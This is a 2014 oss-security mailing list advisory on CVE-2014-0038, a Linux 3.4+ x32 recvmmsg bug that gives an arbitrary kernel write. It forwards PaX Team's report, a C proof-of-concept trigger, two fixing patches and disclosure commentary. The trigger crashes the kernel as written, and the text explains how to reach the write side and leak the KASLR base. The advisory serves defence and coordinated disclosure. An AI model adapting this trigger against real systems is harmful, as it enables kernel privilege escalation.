@@ -1,0 +1,315 @@
+
+Date: Fri, 31 Jan 2014 04:11:16 +0400
+From: Solar Designer <solar@...nwall.com>
+To: oss-security@...ts.openwall.com
+Subject: Linux 3.4+: arbitrary write with CONFIG_X86_X32 (CVE-2014-0038)
+
+Hi,
+
+This issue was brought to linux-distros and security@k.o 2 days ago via
+the message quoted below, and it was just made public at 22:00 UTC today
+(two hours ago) via grsecurity and PaX (who were the ones to find the
+issue).  Normally, the person who brought this to linux-distros would be
+the one responsible to bring the issue to oss-security as soon as the
+issue is public, but Kees does not appear to be around at the moment and
+the issue is critical enough that I find it inappropriate to delay this
+posting by a few hours more, hence I am doing Kees' job by posting this
+in here.
+
+This is CVE-2014-0038 (assigned shortly after Kees sent the message
+below).  I will also include PaX Team's revised patch below.
+
+----- Forwarded message from Kees Cook <keescook@...omium.org> -----
+
+From: Kees Cook <keescook@...omium.org>
+Subject: 3.4+: arbitrary write with CONFIG_X86_X32
+Date: Tue, 28 Jan 2014 15:52:58 -0800
+
+This appears to be a serious bug, so I'd like to make sure distros
+have time to prepare updates but PaX Team really wants to get this
+fixes ASAP. When is the soonest Coordinated Release Date distros can
+handle?
+
+(I have no CVE assigned for this since I'm still waiting for my 2014
+allocation.)
+
+Reported by pageexec at
+https://code.google.com/p/chromium/issues/detail?id=338594, which is
+restricted, so here's the full report:
+----
+asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg,
+                                    unsigned int vlen, unsigned int flags,
+                                    struct compat_timespec __user *timeout)
+{
+        int datagrams;
+        struct timespec ktspec;
+
+        if (flags & MSG_CMSG_COMPAT)
+                return -EINVAL;
+
+        if (COMPAT_USE_64BIT_TIME)
+                return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+                                      flags | MSG_CMSG_COMPAT,
+                                      (struct timespec *) timeout);
+/*...*/
+
+The timeout pointer parameter is provided by userland (hence the
+__user annotation) but for x32 syscalls it's simply cast to a kernel
+pointer and is passed to __sys_recvmmsg which will eventually directly
+dereference it for both reading and writing. Other callers to
+__sys_recvmmsg properly copy from userland to the kernel first.
+
+The impact is a sort of arbitrary kernel write-where-what primitive by
+unprivileged users where the to-be-written area must contain valid
+timespec data initially (the first 64 bit long field must be positive
+and the second one must be < 1G).
+
+The bug was introduced by commit
+http://git.kernel.org/linus/ee4fa23c4b (other uses of
+COMPAT_USE_64BIT_TIME seem fine) and should affect all kernels since
+3.4 (and perhaps vendor kernels if they backported x32 support along
+with this code). Note that CONFIG_X86_X32_ABI gets enabled at build
+time and only if CONFIG_X86_X32 is enabled and ld can build x32
+executables.
+
+Suggested fix:
+Signed-off-by: PaX Team <pageexec@...email.hu>
+
+--- a/net/compat.c  2014-01-20 12:36:54.372997752 +0100
++++ b/net/compat.c      2014-01-28 02:06:59.265506171 +0100
+@@ -780,22 +780,25 @@
+        if (flags & MSG_CMSG_COMPAT)
+                return -EINVAL;
+
+-       if (COMPAT_USE_64BIT_TIME)
+-               return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+-                                     flags | MSG_CMSG_COMPAT,
+-                                     (struct timespec *) timeout);
+-
+        if (timeout == NULL)
+                return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+                                      flags | MSG_CMSG_COMPAT, NULL);
+
+-       if (get_compat_timespec(&ktspec, timeout))
++       if (COMPAT_USE_64BIT_TIME) {
++               if (copy_from_user(&ktspec, timeout, sizeof(ktspec)))
++                       return -EFAULT;
++       } else if (get_compat_timespec(&ktspec, timeout))
+                return -EFAULT;
+
+        datagrams = __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+                                   flags | MSG_CMSG_COMPAT, &ktspec);
+-       if (datagrams > 0 && put_compat_timespec(&ktspec, timeout))
+-               datagrams = -EFAULT;
++       if (datagrams > 0) {
++               if (COMPAT_USE_64BIT_TIME) {
++                       if (copy_to_user(timeout, &ktspec, sizeof(ktspec)))
++                               datagrams = -EFAULT;
++               } else if (put_compat_timespec(&ktspec, timeout))
++                       datagrams = -EFAULT;
++       }
+
+        return datagrams;
+ }
+
+So I couldn't help it and created a simple PoC trigger based on the
+example in the manpage. As it is, it'll just trigger a null-deref oops
+on the read side:
+
+BUG: unable to handle kernel NULL pointer dereference at 0000000000000009
+IP: [<ffffffff82a333cb>] __sys_recvmmsg+0x3b/0x310
+
+By passing an appropriate value for the timeout pointer one can
+trigger the write side too. By the way, this also allows scanning the
+kernel address space and even reveal KASLR (try every 2MB, if no oops
+-> found the kernel), no doubt to Kees' delight :).
+
+/*
+ * PoC trigger for the linux 3.4+ recvmmsg x32 compat bug, based on the manpage
+ *
+ * https://code.google.com/p/chromium/issues/detail?id=338594
+ *
+ * $ while true; do echo $RANDOM > /dev/udp/127.0.0.1/1234; sleep 0.25; done
+ */
+
+#define _GNU_SOURCE
+#include <netinet/ip.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+
+#define __X32_SYSCALL_BIT 0x40000000
+#undef __NR_recvmmsg
+#define __NR_recvmmsg (__X32_SYSCALL_BIT + 537)
+
+int
+main(void)
+{
+#define VLEN 10
+#define BUFSIZE 200
+#define TIMEOUT 1
+    int sockfd, retval, i;
+    struct sockaddr_in sa;
+    struct mmsghdr msgs[VLEN];
+    struct iovec iovecs[VLEN];
+    char bufs[VLEN][BUFSIZE+1];
+    struct timespec timeout;
+
+    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sockfd == -1) {
+        perror("socket()");
+        exit(EXIT_FAILURE);
+    }
+
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    sa.sin_port = htons(1234);
+    if (bind(sockfd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {
+        perror("bind()");
+        exit(EXIT_FAILURE);
+    }
+
+    memset(msgs, 0, sizeof(msgs));
+    for (i = 0; i < VLEN; i++) {
+        iovecs[i].iov_base         = bufs[i];
+        iovecs[i].iov_len          = BUFSIZE;
+        msgs[i].msg_hdr.msg_iov    = &iovecs[i];
+        msgs[i].msg_hdr.msg_iovlen = 1;
+    }
+
+    timeout.tv_sec = TIMEOUT;
+    timeout.tv_nsec = 0;
+
+//    retval = recvmmsg(sockfd, msgs, VLEN, 0, &timeout);
+//    retval = syscall(__NR_recvmmsg, sockfd, msgs, VLEN, 0, &timeout);
+    retval = syscall(__NR_recvmmsg, sockfd, msgs, VLEN, 0, (void *)1ul);
+    if (retval == -1) {
+        perror("recvmmsg()");
+        exit(EXIT_FAILURE);
+    }
+
+    printf("%d messages received\n", retval);
+    for (i = 0; i < retval; i++) {
+        bufs[i][msgs[i].msg_len] = 0;
+        printf("%d %s", i+1, bufs[i]);
+    }
+    exit(EXIT_SUCCESS);
+}
+----
+
+-Kees
+
+-- 
+Kees Cook
+Chrome OS Security
+
+----- End forwarded message -----
+
+----- Forwarded message from PaX Team <pageexec@...email.hu> -----
+
+From: "PaX Team" <pageexec@...email.hu>
+Subject: Re: 3.4+: arbitrary write with CONFIG_X86_X32
+Date: Thu, 30 Jan 2014 14:45:53 +0100
+
+On 30 Jan 2014 at 14:24, security@...nel.org wrote:
+
+> On 29 Jan 2014 at 20:06, H. Peter Anvin wrote:
+> 
+> > Longer term we may want to do something fancier with
+> > get_compat_timespec() and put_compat_timespec() to encapsulate
+> > COMPAT_USE_64BIT_TIME, but this is not the time.
+> 
+> Yeah, I didn't go that route because these functions have a dozen
+> other callers (including gems like compat_get_timespec calling
+> get_compat_timespec where the former does treat x32) and I didn't
+> want to find out if all of them would need the x32 treatment when
+> fixing this bug is much more urgent.
+
+Actually, I think we can use compat_*_timespec here as I effectively
+ended up open coding them, so here's the new and simpler patch:
+
+Signed-off-by: PaX Team <pageexec@...email.hu>
+
+--- a/net/compat.c	2014-01-20 12:36:54.372997752 +0100
++++ b/net/compat.c	2014-01-30 14:29:15.385082301 +0100
+@@ -780,21 +780,16 @@
+ 	if (flags & MSG_CMSG_COMPAT)
+ 		return -EINVAL;
+ 
+-	if (COMPAT_USE_64BIT_TIME)
+-		return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+-				      flags | MSG_CMSG_COMPAT,
+-				      (struct timespec *) timeout);
+-
+ 	if (timeout == NULL)
+ 		return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+ 				      flags | MSG_CMSG_COMPAT, NULL);
+ 
+-	if (get_compat_timespec(&ktspec, timeout))
++	if (compat_get_timespec(&ktspec, timeout))
+ 		return -EFAULT;
+ 
+ 	datagrams = __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+ 				   flags | MSG_CMSG_COMPAT, &ktspec);
+-	if (datagrams > 0 && put_compat_timespec(&ktspec, timeout))
++	if (datagrams > 0 && compat_put_timespec(&ktspec, timeout))
+ 		datagrams = -EFAULT;
+ 
+ 	return datagrams;
+
+----- End forwarded message -----
+
+Both patches were Acked-by: H. Peter Anvin <hpa@...ux.intel.com> (when
+each was the current patch), and I guess the newer patch (from the
+second forwarded message above) is preferable (the one I expect to see
+committed soon).
+
+It appears, from the linux-distros discussion, that a couple of distros
+are going to release emergency security updates for this.  If they did
+not express interest in an extra day of embargo, the issue would likely
+be made public on the first day (not on the second).
+
+In one of the messages on linux-distros, I commented on whether using
+the list for an issue like this was even appropriate, as follows:
+
+"BTW, if this were not limited to x32, I'd say that posting the info
+directly to linux-distros (rather than e.g. posting a "please contact me
+for details if affected and need more detail") would be inappropriate,
+because it's a high impact bug, whereas this list is for medium overall
+severity issues:
+
+http://oss-security.openwall.org/wiki/mailing-lists/distros
+
+"To report a non-public medium severity 1) security issue to one of
+these lists, send e-mail to distros [at] ..."
+
+"1) Medium overall severity as estimated by risk probability and risk
+impact product.  It is recommended that low severity security issues be
+reported to the public oss-security list right away, whereas high
+severity ones be reported to the affected vendors directly."
+
+It's the x32 aspect that reduces the overall severity in this case."
+
+Arbitrary selection of additional detail/commentary, from Twitter:
+
+During the first day (of two) of embargo of this vuln:
+
+<grsecurity> My hatred for embargoes and vendor-sec-like lists cannot be adequately expressed
+
+Right after the coordinated disclosure date/time (today):
+
+<grsecurity> If you're running Linux 3.4 or newer and enabled CONFIG_X86_X32 , you need to disable it or update immediately; upstream vuln CVE-2014-0038
+<grsecurity> It doesn't get any more serious, nearly an arbitrary write which nothing (including grsecurity) will prevent exploitation of
+<grsecurity> To give you an idea of the level of testing that went into X32 support, a syscall fuzzer trying random syscall numbers could have found this
+<grsecurity> Yet it sat in the kernel for over a year and a half
+<grsecurity> I would not be surprised to see an exploit for this within the next few days
+<@grsecurity> @awasi1001 Our latest test patch uploaded today contains the fix.  The stable 3.2 tree is not affected.
+
+<grsecurity> In case there's confusion, this vuln is not about 32bit userland on 64bit (CONFIG_X86_32), but the new X32 ABI.  Ubuntu enables it recently
+
+<djrbliss> Seems the X32 privesc (CVE-2014-0038) was introduced in the final five lines of this commit: http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/net/compat.c?id=ee4fa23c4bfcc635d077a9633d405610de45bc70
+
+Alexander
